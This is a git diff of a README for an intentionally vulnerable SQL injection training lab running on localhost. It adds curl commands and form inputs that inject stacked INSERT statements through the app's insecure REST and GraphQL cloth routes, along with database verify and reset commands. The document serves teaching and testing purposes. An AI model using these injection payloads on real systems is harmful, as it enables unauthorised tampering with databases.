@@ -101,11 +101,6 @@ All routes served from `http://localhost:5001`. Full interactive docs at `/api-d
 
 ## SQL Injection Exploit Examples
 
-> **Injection context varies by route and parameter** — always check whether
-> the value sits inside `'...'` (string context, break with `'`) or is bare
-> (integer context, break with `)` or a SQL keyword). Using the wrong break
-> character produces a syntax error, not an injection.
-
 ### Injection context reference — REST
 
 | Route | Interpolated SQL fragment | userid ctx | clothid ctx |
@@ -125,6 +120,91 @@ All routes served from `http://localhost:5001`. Full interactive docs at `/api-d
 `addInsecureCloth` is the **only route** with a string-context parameter.
 `clothid` sits inside `'...'` in the SQL — the `'` break applies there and
 nowhere else in the app.
+
+---
+
+## Exploiting Anonymous Insecure REST Pages
+
+### Add Cloth
+
+> Note: ensure the cloth ID is not already assigned to the user — a duplicate key error will be returned.
+
+**Curl / Postman**
+```bash
+curl -s -X POST http://localhost:5001/api/insecure-users/clothes \
+  -H "Content-Type: application/json" \
+  -d '{"userid":"5","clothid":"9); INSERT INTO users(name,surname) VALUES('"'"'Alex'"'"','"'"'Injected'"'"'); --"}'
+```
+
+**GUI** — navigate to the insecure user detail page, paste into the **Add Cloth** field:
+```
+9); INSERT INTO users(name,surname) VALUES('Alex','Injected'); --
+```
+
+---
+
+### Remove Cloth
+
+> Note: userid comes from the URL. Only the cloth ID field is injectable.
+
+**Curl / Postman**
+```bash
+curl -s -X POST http://localhost:5001/api/insecure-users/remove-cloth \
+  -H "Content-Type: application/json" \
+  -d '{"userid":"1","clothid":"1; INSERT INTO users(name,surname) VALUES('"'"'Alex'"'"','"'"'Injected'"'"'); --"}'
+```
+
+**GUI** — paste into the **Remove Cloth** field:
+```
+1; INSERT INTO users(name,surname) VALUES('Alex','Injected'); --
+```
+
+---
+
+## Exploiting Insecure GraphQL Page (`/graphql-insecure`)
+
+### Add Cloth — clothid is string context (`'${clothid}'` in SQL)
+
+> This is the only string-context injection in the app — break with `'`, not `)`.
+
+**Curl / Postman**
+```bash
+curl -s -X POST http://localhost:5001/graphql-insecure \
+  -H "Content-Type: application/json" \
+  -d '{"query":"mutation { addInsecureCloth(userid: 5, clothid: \"9'"'"'); INSERT INTO users(name,surname) VALUES('"'"'Alex'"'"','"'"'Injected'"'"'); --\") }"}'
+```
+
+**GUI** — navigate to the insecure GraphQL user page, paste into the **Add Cloth** field:
+```
+9'); INSERT INTO users(name,surname) VALUES('Alex','Injected'); --
+```
+
+---
+
+### Remove Cloth — both parameters are integer context
+
+**Curl / Postman**
+```bash
+curl -s -X POST http://localhost:5001/graphql-insecure \
+  -H "Content-Type: application/json" \
+  -d '{"query":"mutation { removeInsecureCloth(userid: 1, clothid: \"1; INSERT INTO users(name,surname) VALUES('"'"'Alex'"'"','"'"'Injected'"'"'); --\") }"}'
+```
+
+**GUI** — paste into the **Remove Cloth** field:
+```
+1; INSERT INTO users(name,surname) VALUES('Alex','Injected'); --
+```
+
+---
+
+### Verify
+
+```bash
+docker exec -it sqlinj-db psql -U sql_lab_user -d sqlinjproject \
+  -c "SELECT * FROM users ORDER BY userid;"
+```
+
+Reset: `docker compose down -v && docker compose up -d`
 
 ---
 
